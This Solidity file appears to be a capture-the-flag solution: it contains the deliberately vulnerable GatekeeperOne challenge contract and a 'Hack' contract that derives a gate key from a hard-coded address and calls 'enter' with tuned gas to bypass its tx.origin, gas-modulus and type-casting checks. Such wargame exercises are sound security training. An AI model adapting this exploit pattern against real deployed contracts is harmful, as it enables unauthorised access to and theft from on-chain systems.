// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract Hack {
  bytes8 public gateKey = bytes8(uint64(1 << 63)+uint64(uint16(uint160(0x7f550AC594076dE082760126ff95BF8b73248497))));


  GatekeeperOne public target;
  constructor(address _targetAddress) {
      target = GatekeeperOne(_targetAddress);
  }
    

  function attack(uint gas) public {
      require(gas<8191,"gas >= 8191");
      target.enter{gas:8191*10+gas}(gateKey);
  } 
}